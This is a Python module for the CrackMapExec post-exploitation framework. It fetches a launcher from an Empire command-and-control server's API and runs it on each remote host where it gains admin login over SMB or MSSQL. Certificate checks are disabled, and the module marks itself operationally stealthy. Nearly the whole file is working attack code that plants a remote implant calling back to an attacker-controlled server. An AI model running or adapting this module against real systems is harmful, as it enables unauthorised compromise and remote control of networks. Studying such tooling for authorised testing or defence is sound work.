import sys
import requests
from requests import ConnectionError

#The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CMEModule:
    '''
        Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
        Module by @byt3bl33d3r
    '''

    name='empire_exec'
    description = "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            LISTENER    Listener name to generate the launcher for
        '''

        if 'LISTENER' not in module_options:
            context.log.error('LISTENER option is required!')
            sys.exit(1)

        self.empire_launcher = None

        headers = {'Content-Type': 'application/json'}
        #Pull the host and port from the config file
        base_url = f"https://{context.conf.get('Empire', 'api_host')}:{context.conf.get('Empire', 'api_port')}"


        try:
            #Pull the username and password from the config file
            payload = {'username': context.conf.get('Empire', 'username'),
                       'password': context.conf.get('Empire', 'password')}

            r = requests.post(
                f'{base_url}/api/admin/login',
                json=payload,
                headers=headers,
                verify=False,
            )

            if r.status_code == 200:
                token = r.json()['token']
            else:
                context.log.error("Error authenticating to Empire's RESTful API server!")
                sys.exit(1)

            payload = {'StagerName': 'multi/launcher', 'Listener': module_options['LISTENER']}
            r = requests.post(
                base_url + f'/api/stagers?token={token}',
                json=payload,
                headers=headers,
                verify=False,
            )


            response = r.json()
            if "error" in response:
                context.log.error(f'Error from empire : {response["error"]}')
                sys.exit(1)

            self.empire_launcher = response['multi/launcher']['Output']

            context.log.success(
                f"Successfully generated launcher for listener '{module_options['LISTENER']}'"
            )


        except ConnectionError as e:
            context.log.error(f"Unable to connect to Empire's RESTful API: {e}")
            sys.exit(1)

    def on_admin_login(self, context, connection):
        if self.empire_launcher:
            connection.execute(self.empire_launcher)
            context.log.success('Executed Empire Launcher')
